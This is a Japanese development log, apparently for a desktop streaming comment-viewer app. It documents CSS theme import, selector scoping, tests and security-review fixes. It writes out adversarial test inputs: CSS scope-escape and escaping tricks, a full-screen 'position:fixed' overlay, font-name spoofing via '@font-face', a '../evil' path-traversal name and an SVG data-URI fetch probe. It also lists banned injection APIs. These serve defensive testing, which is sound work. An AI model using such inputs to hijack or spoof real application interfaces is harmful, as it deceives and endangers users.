| **(10-i)** | `OverlayApp.tsx` / `OverlayThemeCard.tsx` / `cssScope.ts` に **`innerHTML` / `dangerouslySetInnerHTML` / `insertRule` / `adoptedStyleSheets` が現れない** |

### テスト（**+109 件 → 979 passed / 43 files**）

- **`cssScope.test.ts`（57 件）**: 仕様表の全ケース（`:root` / `html` / `body` / `.sd-overlay` の読み替え・
  `@keyframes` 不介入・`@media` プレリュード不介入・カンマ分割の構文判定・壊れた CSS で throw しない）／
  **実サンプル 2 本**を `rewriteSelectors` → `scopeSelectors` の順で通し**出力全文を厳密一致で固定**／
  `unclosedBlockDepth` を実測形（`.a{` / `.a{color:red;`）で固定。
- **`overlaySettings.theme.test.ts`（13 件）**: 未保存 / 6 種の不正値 / 例外 → `null`、`null` はキー削除、
  **CSS 本文がこのキーに載らない**こと。
- **`OverlayApp.test.tsx`（10 件・新規ファイル）**: `<style>` が 1 つだけ／5 回切り替えても 1 つのまま／
  `null` で 0 個／`</style>` を含む CSS で `textContent` 一致／`storage` で切替／`clear()`（key=null）でも既定へ／
  アンマウントで除去／**取得失敗で既定へ倒し localStorage を書き換えない**／不正 id ならコマンドを呼ばない。
- **`OverlayThemeCard.test.tsx`（29 件）**: 一覧・選択・**「既定に戻す」（一覧取得失敗時も押せる）**・
  削除確認・選択中削除で既定へ・`selectedMissing` 警告・取り込みフロー（初期値・パス非表示・空/81 文字の拒否）・
  **同名でもブロックしない**・Rust の固定文言の透過・結果文言 8 種・**clamp（2 万件／5 万文字）**・
  ①の警告と**誤報しないこと 3 ケース**・プレビューのスコープ化と `<style>` の出し入れ。

### ミューテーション（8 種）—— ⚠ **jsdom では殺せない 1 件が見つかった**

| 変異 | ランタイムテスト | 静的ガード |
| --- | --- | --- |
| `<style>` の removal（cleanup）を外す | **レッド 4 件** | — |
| `scopeSelectors` の root 読み替えを素朴な前置へ戻す | **レッド 15 件** | — |
| 「既定のデザインに戻す」を無効化 | **レッド 2 件** | — |
| **注入を `innerHTML` にする** | ⚠ **緑（殺せない）** | **レッド (10-i)** |
| `unmatched` の clamp を外す | **レッド 2 件** | — |
| `unclosedBlockDepth` を常に 0 にする | **レッド 2 件** | — |
| プレビューのスコープ化を外す | **レッド 1 件** | — |
| ラッパを CSS モジュールのクラスへ差し替える | **レッド 1 件**（テスト追加後） | **レッド (10-h)** |

⚠⚠ **`innerHTML` への退行はランタイムテストでは原理的に殺せない**（実測 2026-08-05）。
jsdom は `<style>.innerHTML` に **RAWTEXT のフラグメント解析を実装しておらず**、`textContent` 経路と
**完全に同じ結果**になる（`textContent` / `childNodes` / `sheet.cssRules` が一致し、逃げ出す `<img>` も 0 件）。
実ブラウザ（WKWebView / WebView2）では `</style>` で要素が閉じるので挙動が分かれるが、jsdom では観測できない。
→ **この不変条件を実際に殺しているのは (10-i) だけ。ガードを消さないこと。**
テスト側は「何が正しい形か」を仕様として残し、実ブラウザでの退行を捕まえる役割で維持する
（(10-a) と `CommentList.test.tsx` の役割分担と**主従が逆**）。

⚠ ラッパのクラス差し替えも当初はテストで殺せなかった（プレビューが**黙って無反映**になるだけ）。
`.sd-preview` の存在を assert するテストを足して、ガードと二重に固定した。

### ⚠ 敵対的入力でのスコープ脱出テスト（2026-08-05 実測・**脱出ゼロ**）

⚠⚠ **プレビューはオーバーレイ窓ではなく「コメビュ窓の中」で第三者の CSS を走らせる**（この窓には設定 UI がある）。
スコープ化が破れると窓全体が乗っ取られるので、走査器を desync させて「ラッパの外に出るルール」を作れないかを
**23 パターン**で実測した。**脱出はゼロ。**

- 通した形: 宣言中の文字列の `}` ／ 未終端の文字列 ／ コメント中の `{` ／ 未終端コメント ／ `url()` 中の `}` ／
  余分な `}` ／ `@media` を閉じた直後 ／ `@media` 未閉鎖 ／ `@keyframes`・`@font-face` の直後 ／ `@import` 文の直後 ／
  `;;;` ／ CSS Nesting から祖先を狙う形 ／ **`html:has(…)` / `*:has(…)` で祖先を狙う形** ／ 先頭・末尾カンマ ／
  `\7d` エスケープ ／ `@scope` ／ `@layer` の文形と block 形 ／ CDO/CDC ／ BOM ／ root 相当の連鎖の直後。
- ⚠ **`:has()` による祖先狙いは前置で無力化される**（`html:has(.sd-preview) .escaped` → `.sd-preview:has(…) .escaped`）。
- **既知の限界 2 件（いずれも安全側＝「プレビューで効かなくなる」方向にしか外れない）**:
  ①未終端コメントの中身はルールにならない（ブラウザと同じ挙動なので前置しない）
  ②**CDO/CDC（`<!--` / `-->`）を含むと前置でセレクタが不正になりルールごと落ちる**（本来は最上位で無視される
  トークンなので `.escaped` が効くはず＝**過剰制限**）。実例が出たら対応する。
- 14 パターンを `cssScope.test.ts` に回帰テストとして固定した。

**性能（実測・256KB 級の病的入力でもハングしない）**

| 入力 | 実測 |
| --- | --- |
| 先頭 root 相当を 5 万回反復（244KB・`scopePart` のループが毎回 slice する形） | **6.6ms** |
| 現実的な 178KB（4000 ルール）で `rewriteSelectors` → `scopeSelectors` | **15.0ms** |
| `unclosedBlockDepth`（同上） | **0.7ms** |
| カンマ 2 万個 / `@media` 5000 段ネスト | **3.6ms / 2.2ms** |

⚠ `scopePart` の「続けて並ぶ root 相当を取り除く」ループは理屈上 O(n²) に見えるが、V8 の sliced string により
実測は線形（上表）。**再修正トリガー＝走査器を index ベースから文字列コピーへ書き換えるとき。**

### 変更ファイル

**新規**: `features/comment-viewer/overlayThemeApi.ts` ／ `features/comment-viewer/cssScope.ts` ／
`screens/comment-viewer/OverlayThemeCard.tsx` ＋ テスト 4 本
（`cssScope.test.ts` / `overlaySettings.theme.test.ts` / `OverlayApp.test.tsx` / `OverlayThemeCard.test.tsx`）。
**変更**: `features/comment-viewer/overlaySettings.ts` ／ `screens/comment-viewer/OverlayApp.tsx` ／
`screens/comment-viewer/SettingsView.tsx`（1 行）／`screens/comment-viewer/CommentViewerApp.module.css`（新規 5 クラス）／
`scripts/check-css-guards.mjs`（(10-h)/(10-i)）。

⚠ **CSS 差分ゼロは達成していない**（一覧の行とプレビュー枠に箱が要る）。足したのは
`.themeList` / `.themeRow` / `.themeRowMain` / `.themeName` / `.themePreview` の 5 つで、
**役割トークンのみ・`--text-faint` 不使用・054 の 3 段規則どおり**（項目名 13px/700 は既存値と同値）。

### ゼロ拡大の実測（すべて差分ゼロを確認）

`apps/desktop/src-tauri/` ／ `apps/comment-sidecar/` ／ `.github/` ／
`package.json`・`pnpm-lock.yaml`（**新規依存ゼロ**）／
**`cssCompat.ts`（060a の資産に無改変）** ／ `CommentList.tsx` ／ `PinnedOverlayApp.tsx`。
`grep -rn "dangerouslySetInnerHTML\|innerHTML" apps/desktop/src` の本番コードのヒットは**コメントのみ**。

### 検証

`typecheck` ✅ ／ `lint` ✅ ／ `test` ✅ **979 passed / 43 files**（＋CSS guard OK ／ Version sync OK）。

### 軽レビュー（2026-08-05・修正必須 0 件）

必須 3 点をすべて確認した:

1. **注入経路は `<style>` の `textContent` のみ** —— `createElement("style")` は 2 か所（注入・プレビュー）で
   どちらも `textContent`。本番コードに `innerHTML` / `dangerouslySetInnerHTML` / `insertRule` /
   `adoptedStyleSheets` はゼロ（ガード (10-i) が恒久化）。
2. **プレビューの CSS が窓全体へ漏れない** —— `scopeSelectors` 適用済み。生成される CSS 文字列を厳密一致で固定し、
   スコープ化を外す変異／ラッパのクラスを差し替える変異の**両方**がレッドになることを実測。
3. **「既定に戻す」で必ず復帰できる** —— 常時表示・常時有効。一覧取得失敗時も押せることをテストで固定。

そのほか: §9（パス・CSS 本文・除去 URL を画面にもログにも出さない。`with_filename_detail` は
**ファイル名のみを `details` に載せる**ので `toErrorMessage` が読む `message` にパスは入らない）／
frontend から shell 実行なし・OS 操作は Rust 側のまま／DB スキーマ変更なし（型は ts-rs 生成の再 export）／
タスク範囲外の変更なし。

### テストの追い足し（security-review 対応・2026-08-05）—— **979 → 1004 passed / 43 files**

| 追加先 | 件数 | 何を仕様として固定したか |
| --- | --- | --- |
| `cssScope.test.ts` | **+14**（57→71） | S-1 の 2 軸（無引用 `url(` トークン／文字列の外の CSS エスケープ）／`\75 rl(` の綴り隠し／引用形 `url("…")` は不透明にしない／root 相当のトークン境界（`\` と非 ASCII）／未終端でも無限ループしない。⚠ **`unclosedBlockDepth` の既知の見落とし**（Q-1）も「見落とす」ことを明示テストで固定＝**060c で `truncated_to_eof` を足したら書き換える印**にした |
| `OverlayThemeCard.test.tsx` | **+11**（29→40） | S-6（ファイル名の clamp と bidi 除去）／Q-6（`analyze` 失敗を黙らせない）／Q-8（「うち少なくとも N 件」）／⚠ **プレビュー `<style>` のライフサイクル 6 経路**（切替で 0 or 1 個・アンマウント・削除・取得失敗・`selectedMissing`・`</style>` 入り CSS でも `textContent` のみ）／Q-5（**取り込み中でも「既定のデザインに戻す」が押せる**） |
| `check-css-guards.mjs` | **(10-i) を反転 ＋ (10-j) 新設** | (10-i): `src/` 全体で生 HTML/CSSOM 注入を禁止（**書き込みのみ**。`innerHTML` の読み取りは既存テストの assert なので対象外）＋ `<style>`/`<link>` 生成箇所の allow-list ＝ **4 つ目の注入先が増えたら落ちる**。(10-j): `.themePreview` の **`contain: paint`** と `overflow: hidden` の存在（⚠ jsdom はレイアウトを持たないので、S-2 の機械的な受け皿はここだけ） |

**ミューテーション（全 5 種レッドを実測）**: `url` トークンの不透明扱いを外す → 6 件赤／ident 読みを外す → 8 件赤／
`splitTopLevelCommas` のエスケープを外す → 1 件赤／`textContent` を `innerHTML` へ → **(10-i) が赤**／
`contain: paint` を消す → **(10-j) が赤**／`<style>` 生成を 3 ファイル目に足す → **(10-i) が赤**。

⚠ **Rust 側は無変更・`cargo test overlay_theme` は 78 passed**。実機確認 2〜6 に相当する検証
（`<uuid>.css` だけが増える／`../evil` がディレクトリを脱出しない／削除と二重削除／`.txt`・256KB 超・
バイナリの拒否／`@media` プレリュードの拒否）は**すべて Rust の単体テストで機械的に固定済み**なので、
実機ではその**配線**（ダイアログ →コマンド→ ディスク）だけを見ればよい。

### ⚠ 実機確認は未実施（本人の手番）—— **060b から移管した 1〜4・6・7 を含む**

1. **[060b-1]** 実サンプル CSS を取り込む → 名前を付けて一覧に出る／件数が表示される。
   ⚠⚠ **「書体しか効かない」のが仕様どおり**（意匠の実体が除去した `@import` の中にある）。
   ⑨の「うち N 件は外部サイトの CSS の読み込み（@import）です」でそう読めるかを確認する。
2. **[060b-2]** `~/Library/Application Support/<bundle-id>/themes/` に `<uuid>.css` **だけ**が増える。
3. **[060b-3]** テーマ名に `../evil` を入れても管理ディレクトリ外にファイルが出ない。
4. **[060b-4]** 削除でファイル実体も消える／二重削除でも落ちない（`NotFound` になるだけ）。
5. **[060b-6]** `.txt` ／ 256KB 超 ／ `.css` にリネームした PNG が拒否される。
6. **[060b-7]** `@media (min-width: calc(1px + url(https://x))){…}` が拒否され、Rust の固定文言が出る。
7. 選択 → オーバーレイの見た目が変わる（開いたまま／ダメでも開き直して）。
8. `.sd-comment{display:none}` だけのテーマで配信画面が空になる → **「既定のデザインに戻す」で復帰**。
9. 5 回切り替えて DevTools の `<head>` に `<style data-sd-overlay-theme>` が **1 つだけ**。
10. プレビュー表示中にコメビュ窓の他の部分が壊れない。⚠ **security-review Q-14 で 3 ケースに具体化した**
    （jsdom はレイアウトも実フォントも再現しないので、ここは実機でしか見られない）:
    - (a) `:root` を含むサンプル（従来どおり）
    - (b) **`position:fixed` を含むテーマ** ——
      `.sd-comment{position:fixed;inset:0;z-index:2147483647;background:#000}` を入れ、
      **プレビュー枠の中に収まり、「既定のデザインに戻す」ボタンが覆われない**こと（S-2 の `contain: paint`）。
    - (c) **既存フォント名を再定義するテーマ** ——
      `@font-face{font-family:"Segoe UI";src:local("Comic Sans MS")}` を入れ、
      **コメビュ窓の他の文字が変わらないか**を見る（S-3・変わるなら shadow root 移行の判断材料）。
11. 対応の取れていない `(` を含む CSS → ①の警告が出る。
    ⚠ 併せて **`@import url(https://…` の `)` 忘れでは警告が出ない**ことも確認する（Q-1 の既知の見落とし・
    「後半が黙って消えるのに警告なし」が実機でどう見えるかを 060c の判断材料にする）。
12. `lsof -i` で外部 ESTABLISHED が増えない。
13. ⚠⚠ **[060b-S-5] フラグメント無し SVG data URI が `filter:` でリソース文書として fetch されるか**
    （security-review S-4 で**実機確認リストへ格上げ**）。060a / 060b の時点では注入経路がゼロだったので
    実害が無かったが、**060d が経路を開いたので今日から現実のリスク**である。手順は
    `overlay_theme/sanitize.rs` の module doc（アプリ不要・5 分）:
    `python3 -m http.server 8000` を上げ、`filter:url("data:image/svg+xml,…feImage href='http://127.0.0.1:8000/HIT.png'…")`
    を素の HTML で **Safari（WKWebView 相当）と Edge（WebView2 相当）**で開き、アクセスログに `HIT` が出るか。
    出たら → `data:` の MIME 許可リスト（`image/svg+xml` を除外）へ踏み込む。
    **出なくても実測した事実をここに残すこと。** ⚠ **060c の着手前提とする。**

### ⚠⚠ security-review（別チャット・2026-08-05）—— **判定「修正必須」・対応済み**

上記「レビュー区分」で別チャットへ送った security-review を実施し、**プレビューのスコープ化が実際に破れた**。
`docs/security.md` の「## CSP方針」に **060d 節**を新設し、「レビュー必須条件」の 060d 項に下位条件を 2 本足した。

| # | 指摘 | 対応 |
| --- | --- | --- |
| **S-1** | ⚠⚠ **`scopeSelectors` の走査器が実 CSS パーサと desync し、スコープを脱出できた**（PoC 8 系統・oracle は独立実装の CSS パーサ）。原因は ①**無引用 `url(` トークンを不透明に扱っていない**（`url(data:text/css,/*)` が「コメント開始」に見え EOF まで飲む） ②**CSS エスケープ `\` を扱っていない**（`--x:\{` / `.a\{b` でブロック深さがずれる・`.a\(b,.c` でカンマ分割が壊れる）。⚠ **いずれも 060b のサニタイザを `stripped_count=0`・無改変で通過する**（Rust の `sanitize_css` を直接叩いて実測）＝サニタイザは壁にならない | **修正**。`cssScope.ts` の `scan()` に ident / url トークンの読み分けを追加（16 進エスケープも復元＝`\75 rl(` を `url(` として扱う）、`splitTopLevelCommas` にエスケープ処理を追加、root 相当の否定先読みに `\` と非 ASCII を追加。回帰 12 件・ミューテーション 3 種すべてレッド |
| **S-2** | ⚠ **スコープが効いていてもプレビュー枠の外を覆える**。`overflow:hidden` は `position:fixed` / `absolute` を止めない（祖先に包含ブロックを作る性質が 1 つも無いことを実測）。「既定のデザインに戻す」・OBS パスワード欄を覆えた | **修正**。`.themePreview` に **`contain: paint`**（包含ブロック化＋クリップ＋スタッキングコンテキストを 1 行で） |
| **S-3** | ⚠ **`@font-face` の名前空間汚染は `local()` だけでなく `url(data:font/…)` でも成立する**（実測 `stripped_count=0`）＝任意のグリフを持つフォントでアプリ UI のフォント名を乗っ取れる（表示文字列の偽装）。申し送り 6 の見積もりが狭かった | **受容＋記録**。名前の書き換えは `var()` 経由で破れるので中途半端になる。恒久策は **shadow root / iframe への移行**（設計変更につき別タスク）。範囲を `cssScope.ts` / `OverlayThemeCard.tsx` / `security.md` に明記し、実機確認 10-(c) を追加 |
| **S-4** | 060b の未解決 S-5 は「060d が経路を開いたので今から現実のリスク」 | **実機確認 13 へ格上げ・060c の着手前提に** |
| **S-5** | ガード **(10-i)** がファイル列挙型で、**4 つ目の注入先が増えても落ちない** | **修正**。`src/` 全体の禁止（書き込みのみ・`innerHTML` の**読み取り**は既存テストの assert なので対象外）＋ `<style>` / `<link>` 生成箇所の allow-list（2 ファイル）へ反転。両方向のミューテーションでレッドを確認 |
| **S-6** | `form.fileName` だけ clamp が無い（`unmatched` と非対称）。bidi（`\p{Cf}`）は `\p{Cc}` では落ちない | **修正**。`displayFileName()` を追加（`Cc`＋`Cf` 除去・60 コードポイントで切る） |
| **S-7** | `security.md` に 060d の記録が無い | **修正**（上記） |

**良かった点として確認されたもの**: 新規 egress ゼロ／`console.*` ゼロ／パスと除去 URL を出さない／
`with_filename_detail` は `details` にしか載らないので `toErrorMessage` が読む `message` にパスは入らない／
`OVERLAY_THEME_ID_RE` は Rust の `is_theme_id`（36 文字・`is_ascii_hexdigit`・位置指定の `-`）と**厳密に等価**／
`themeNameError` は `char::is_control` ＝ `\p{Cc}` で厳密に等価／ゼロ拡大は全項目実測どおり。

**品質側の対応**: Q-1（`unclosedBlockDepth` の見落とし＝**修正不要・060c 送り**）／Q-2（切り詰め警告の文言を
「括弧やクォート」へ）／Q-3・Q-4（回帰テストと片方向ドリフトの明文化）／Q-5・Q-7・Q-9・Q-16（**コメントのみ**）／
Q-6（`analyze` 失敗を 1 行出す）／Q-8（「うち**少なくとも** N 件」）／Q-13（060c へ申し送り）／Q-14（実機 10 を 3 ケースへ）。
Q-10・Q-11・Q-12・Q-15 は**指摘なし（現状維持が妥当）**と確認された。

⚠ **Q-1（`unclosedBlockDepth` の見落とし）は未解決のまま 060c へ送った。** 実測:
`@import url(https://…` の `)` 忘れは、除去が EOF まで達しても**深さが 0 のまま**で警告が出ない
（壊れた `(` がトップレベルにあると閉じ忘れが残らないため）。frontend だけでは原理的に埋まらないので、
**060c で `SanitizeOutcome` に `truncated_to_eof: bool` を足す**こと（詳細は `cssScope.ts` の当該注記）。

### ⚠⚠ 「060c をやるか」の判断材料 —— **【決着・2026-08-05】060c は必須と決定**

> ⚠⚠ **本節は判断が付く前の記述で、答えは出た。依頼者が「060c は必須」と決定した（2026-08-05）。**
> 下の「判断の軸は依頼者が自分で CSS を書き直す気があるか」は**もう選択肢ではない**——
> ユーザーに CSS を書き直させる／外部 CSS をコピペさせるのは、060 の目的
> （**ユーザーが持っている CSS がそのまま使える**）から外れるため。以下は経緯として残す。

**060b＋060d で機能は通しで動くようになったが、依頼者の手持ちの CSS では「書体しか変わらない」**——
これは 060a の実サンプル検証（2026-08-04）で既に分かっていたとおりで、**バグではなく仕様**。
実サンプル 2 本の中身は ①外部 `@import` 1 行 ②書体の指定 ③その外部 CSS が読む `--txtcolor` の 3 つだけで、
**吹き出しの意匠は丸ごと外部 CSS の中**にある。今回の UI はその事実を
「うち N 件は外部サイトの CSS の読み込み（@import）です。StreamDock は外部サイトへ接続しないため、
その中に書かれたデザインは反映されません」という 1 文で説明するが、**説明できても意匠は出ない**。
一方で、自分で sd 語彙（`.sd-comment` / `--sd-comment-bg` / `data-sd-tone`）を使って CSS を書く人にとっては
**060d 時点で完全に実用になっている**（変換も注入も切替もプレビューも動く）。
→ **判断の軸は「依頼者が自分で CSS を書き直す気があるか」**。書き直さないなら 060c が payload そのもので、
それ無しでは手持ちの資産が事実上使えない。書き直すなら 060c は不要（そして §1 の例外を新設せずに済む）。
⚠ 併せて「セレクタ契約が実用に足るか」という 060 の中心的な問いは、**外部 CSS の中身を見るまで答えが出ない**
（060c で取り込めば注入時の変換が走るので、`unmatched` が観測手段として効く）。

## 060e CSS を貼り付けて取り込む（2026-08-05）

**ユーザーに `.css` ファイルを作らせない**ための導線を足した。手元の CSS をフォームへ貼って
「取り込む」を押すだけで保存できる。⚠ **security-review 未了**。

### ⚠⚠ 何が「新しい権限」で、何がそうでないか

- **新しいのは「frontend から本文を渡せるコマンドが 1 本増えた」ことだけ。**
  保存先・ファイル名・検証・サニタイズ・上限は**ファイル版とまったく同じ共通コア**
  （`service::store_sanitized_css`）が受け持つ＝ **検証は 1 セットしか存在しない**。
- **書ける場所は 1 バイトも動かない。** `app_data_dir()` → `join("themes")` → `join("<uuid v4>.css")` の
  3 手が各 1 か所に固定されており（契約テスト `the_storage_path_is_built_only_from_the_app_data_dir`）、
  ユーザー入力はそのどこにも入らない。
- ⚠ **攻撃面はファイル版より狭い**——`path` を取らないので、UNC / ネットワークパス経由の egress も、
  「拡張子 `.css` に限定された任意ファイル読み取り」の合成（060b review② の受容事項）も**増えない**。
- **新規 egress ゼロ・新規依存ゼロ・新規 capability ゼロ・`csp: null` 不変。**

### ⚠⚠ 契約テストを「全面禁止」から「出現回数の固定」へ緩めた（意図的）

`takes_no_arbitrary_path_or_content_from_the_frontend` は §3 の
「汎用の `write_file(path, content)` 型を作らない」を機械で守る番人で、**`css: String` を全面禁止**していた。
本タスクは**その番人を意図的に緩める作業**である。

| 変更前 | 変更後 |
| --- | --- |
| `css` / `content` / `bytes` / `data` を **全面禁止** | **`css: String` の出現回数を 1 に固定**（2 本目で落ちる）／`content` / `bytes` / `data` は**引き続き全面禁止** |
| `#[tauri::command]` は **5 個** | **6 個** |

⚠ **禁止を消していない**のが要点——「増やすときに必ず気づく」構造は保たれている。
⚠ 緩めてよいと判断した根拠は「§3 が禁じているのは**書ける場所を呼び出し側が決める**形であって、
本文を渡せること自体ではない」。この判断は `docs/security.md` §5 例外（060b）と
`docs/tasks/060e-paste-css-import.md` に記録した。

### 実装

| 層 | 内容 |
| --- | --- |
| Rust | `commands::import_overlay_theme_text(css, name)`（**同期**）→ `service::import_pasted_text` → **既存の `store_sanitized_css`**。⚠ `origin` は service 側で `Local` を定数として渡す（`commands.rs` に `origin` の文字が現れると `the_theme_origin_is_never_settable_from_the_frontend` が落ちる） |
| frontend | `overlayThemeApi.ts` に `importOverlayThemeText` / `themeCssError` / `cssByteLength`。`OverlayThemeCard` の**既定フォームを貼り付けにした**（`{ kind: "paste" }`）。名前は空なら「デザイン N」（既存と重複しない番号）。ファイル選択は**副導線として残す** |
| CSS | `.themeCssInput` 1 クラス（固定高さ＋等幅・054 の書式規則どおり・フォーカス表現は既存 3 か所と同トークン） |

⚠⚠ **サイズは UTF-8 バイト長で数える**（`new TextEncoder().encode(css).length`）。Rust は `css.len()`
＝バイト長で 256KB を見るので、`css.length`（UTF-16 単位）だと**日本語コメント入り CSS で 3 倍近く食い違い**、
「入力できるのに保存できない」になる。⚠ 060d の `THEME_NAME_MAX_CHARS` は**コードポイント単位**
（Rust が名前は `chars().count()` で見るため）＝**単位が違うので片方に揃えないこと**。

### §9

- CSS 本文は **state → invoke の 1 経路だけ**。`console.*` はゼロのまま。失敗時は **Rust の固定文言**をそのまま出す。
- ⚠ **入力欄（textarea）の中身は §9 の対象外**（ユーザー自身が貼ったもの。パスワード欄に打った文字が
  見えるのと同じ）。テストの判定も「**入力欄の外**に出ていないこと」にしてある
  （最初に書いた「body の textContent に出ない」は誤りで、実測で落ちたので直した）。

### テスト（**1004 → 1013 passed / 43 files**・Rust **78 → 82 passed**）

| 追加先 | 何を固定したか |
| --- | --- |
| `overlay_theme/service.rs` +4 | 貼り付け経路でも ①uuid 名のファイルが 1 つだけ増える ②外部参照が保存されない ③名前・**256KB**・プレリュード拒否が効く ④拒否時はファイルも DB 行も残さない ⑤**エラーに CSS 本文が載らない** ⑥**200 件上限**が効く |
| `OverlayThemeCard.test.tsx` +9（40→49） | 開いた時点で貼り付け欄が出ている／**貼って押すだけで `import_overlay_theme_text` を正しい引数で呼ぶ**／既定名が重複しない／名前を打てばそれが使われる／空では押せない／⚠ **256KB を「あ」×90K（文字数では 256K 未満・バイトでは超過）で判定**／Rust の固定文言をそのまま出し**本文は入力欄の外に出ない**／成功後に欄が空に戻る／ファイル選択からキャンセルで貼り付け欄へ戻る |

⚠ 既存テストのヘルパ（`startImport`）は、**貼り付け欄が常時表示になったことで
「切り替わる前の入力欄を掴む」ようになっていた**ので、見出し（「…に名前を付ける」）で
切り替わりを待つ形へ直した（アサーションは 1 つも緩めていない）。

### ⚠⚠ 060c の代替ではない（誤った記述を取り消した）

本節には一時「外部 `@import` の中身はブラウザで開いてコピペできるので **060c を実装せずに済む可能性が高い**」と
書いていたが、**依頼者の指摘により誤りとして取り消した**（2026-08-05）。**060c は必須。**

- 依頼者のサンプル CSS は**意匠の実体が丸ごと外部 `@import` の中**にある＝ **060c が payload そのもの**。
  それを「ユーザーが毎回ブラウザで URL を開いて view-source してコピペする」に置き換えるのは、
  手間の問題ではなく**機能として成立していない**。060 の目的（ユーザーが持っている CSS がそのまま使える）から外れる。
- ⚠⚠ **そもそもスコープの取り下げ判断は実装者がしてよい種類のものではなかった。**
  実装の副産物を根拠に完了条件を縮める提案を docs へ書き込んだのが誤り。

**060e の位置づけ**: 「CSS の文字列は持っているがファイルにはしていない」人のための入口で、
**060c と直交する**（どちらか一方で足りる関係ではない）。

### 検証

`typecheck` ✅ ／ `lint` ✅ ／ `test` ✅ **1013 passed / 43 files**（＋CSS guard OK ／ Version sync OK）／
`cargo test overlay_theme` ✅ **82 passed** ／ `cargo check` ✅。

### ⚠ 実機確認は未実施（本人の手番）

1. 設定 →「コメントのデザイン」を開いた時点で**貼り付け欄が出ている**。
2. 適当な CSS を貼って「取り込む」→ 一覧に「デザイン 1」が出る。**ファイルは作っていない**。
3. `~/Library/Application Support/<bundle-id>/themes/` に `<uuid>.css` が **1 つだけ**増える。
4. 外部 `@import` を含む CSS を貼る → 「うち少なくとも N 件は外部サイトの CSS の読み込み」が出る。
5. 巨大な CSS（日本語コメント多め・270KB 相当）を貼る → **押せず**に「256KB 以内に」が出る。
6. `@media (min-width: calc(1px + url(https://x))){…}` を貼る → Rust の固定文言が出て、**本文は画面に出ない**。
7. 取り込んだテーマを選択 → オーバーレイの見た目が変わる。
8. ファイル選択（副導線）が従来どおり動く。
9. ⚠ **貼りかけの CSS が消えないこと**（貼る →「名前を変更」→「キャンセル」→ 貼った内容が残っている）。
   security-review② で修正したデータロスの実機確認。
10. ⚠ **巨大貼り付けの体感**（256KB 相当を textarea へ貼って、名前欄のタイプが引っかからないこと）。
    ⚠ `themeCssError` の計算コストは実測済み（0.14ms/回）だが、**React の再レンダーそのもの**は未実測。

### ⚠⚠ security-review②（第三者・別チャット・2026-08-05）—— **判定「修正必須」・対応済み**

⚠⚠ **修正必須は 060e 本体ではなく、同じ working tree に入っていた [B]（060d の自己レビュー→自己修正ぶん）
で出た。**＝ **「見つけた人・直した人・直ったと判断した人が同一」だと閉じきれない**ことの実例が 2 回続いた。

| # | 指摘 | 対応 |
|---|---|---|
| **S-1a** | ⚠⚠ **`\` ＋改行を ident に飲み込んでいた**（css-syntax-3 §4.3.7 では valid escape ではなく **delim トークン**）。そのため**直後の `url(` が url トークンとして認識されず**、中の `{` を実ブロック開始と誤認して以降ずっと深さがずれ、**後続の規則が素のまま出力された**。⚠ サニタイザは `stripped_count=0`・無改変で通し、末尾に `}` を 1 つ足すと `unclosedBlockDepth` も 0 ＝ **警告も出ない** | `isIdentStart(c, next)` / `readIdent` で `\`＋改行を valid escape から除外 |
| **S-1b** | ⚠⚠ **at-keyword の名前のエスケープを復元していなかった**（`/^@([A-Za-z-]+)/`）。`@med\69 a` は**ブラウザにとって `@media` そのもの**（at-keyword トークンの値はエスケープ復元後の ident）なのに `"med"` に化けてグループ規則と認識されず、**中の規則に前置されなかった**。`@suppo\72 ts` / `@lay\65 r` / `@containe\72` / `@scop\65` も同型 | `atRuleName` を **`readIdent` で読む**形へ（エスケープ復元済み・小文字化済み） |
| **Q-1** | `@starting-style` が `GROUP_AT_RULES` から漏れていた（規則リストを持つのに中身に前置されない） | 追加＋「新しいグループ規則が実装されたら足す」トリガーを明記 |
| **Q-2** | 静的ガード **(10-i)** が `insertAdjacentHTML` / `setHTMLUnsafe` / `parseHTMLUnsafe` / `createContextualFragment` を禁止していなかった（**`createElement` を経由しない**ので allow-list 側も素通りする） | 4 つを禁止リストへ追加（現状 0 件なので無コスト） |
| **Q-4** | `docs/security.md` §5 の「②は①より攻撃面が狭い」が**片側だけ正確**だった | 軸を分けて記述（`path` 由来は増えない／**本文の内容支配＝任意バイト列の永続化**は増える＝受容） |
| **Q-5** | 文書グローバルな名前空間を `@font-face` / `@keyframes` の 2 種として記録していた | **`@property` / `@counter-style` を追加**（計 4 種）。受容範囲の記述を更新 |
| **Q-6** | `contain: paint` のサポート下限が未記載 | **Safari 15.4+（macOS 12.3+）/ Chromium 52+** を明記。実機確認で OS バージョンを記録する |
| **Q-3** | `stripTsComments` が文脈なしで `//` を消すので、文字列中の `//` 以降を行ごと見落とす | 既知の限界としてコメント化（厳密化するなら既存 devDependency の `typescript` で読む） |

**追認された点**（＝そのままでよいと確認できたもの）:

- ✅ **§3 の緩め方（`css: String` の全面禁止 → 出現回数 1）は妥当。** 本文経由で保存先・ファイル名・件数・
  サイズを動かす**反例は構成できなかった**。契約テストも骨抜きになっていない（`production_sources()` が
  `//` 始まりの行を落とすので、doc コメントに書いた `` `css: String` `` はカウントされない）。
  ⚠ 残る穴＝ `text:` / `body:` / `source: String` は依然素通り（060e 以前からの穴。**専用 newtype**なら型で固定できる）。
- ✅ **`contain: paint` に CSS だけで抜ける経路は見つからなかった**（`::backdrop` / `popover` / `dialog` /
  `view-transition` はいずれも top layer へ入るのに **JS か属性**が要る）。
- ✅ **§9 は清潔**（`log_command_err` はコード由来の固定文言のみ／`toErrorMessage` は `message` だけ参照／
  `with_filename_detail` はファイル名を `details` にしか置かない）。
- ✅ **ゼロ拡大・凍結資産の無改変・`csp: null` 不変**をすべて実測で確認。
- ✅ **ミューテーション 5 種のうち 4 種が既存テストで死んだ**（url トークン不透明化／`splitTopLevelCommas` の
  エスケープ／ident トークン読み／`IDENT_TAIL`）。**生存 1 件＝直前文字ガード**（`2url(` を url と誤認しない）
  なので回帰を追加した。
- ✅ **実測で確定した判断**: `cssError` の `useMemo` は**不要**（256KB＝261,142 バイトで `trim()`＋
  `TextEncoder.encode()` が **0.14ms/回**）／`import_overlay_theme_text` の**同期化は妥当**
  （256KB の敵対的入力で `sanitize_css` が **2〜3ms**）。

**品質の指摘と対応**:

- ⚠⚠ **データロス（申し送り 2 の既知欠陥）を修正**。`cancelForm()` が無条件に `setCssInput("")` を
  呼んでいたため、貼りかけの CSS が **①キャンセル ②改名の成功 ③ファイル取り込みの成功**の
  **3 経路すべて**で消えていた（レビュー前は①だけの想定だった）。
  `backToPasteForm()`（本文を残す）＋ `runImport(_, clearPastedCss)` に分離し、**貼り付けが保存できたときだけ**
  空へ戻す形へ。回帰 3 件を追加。
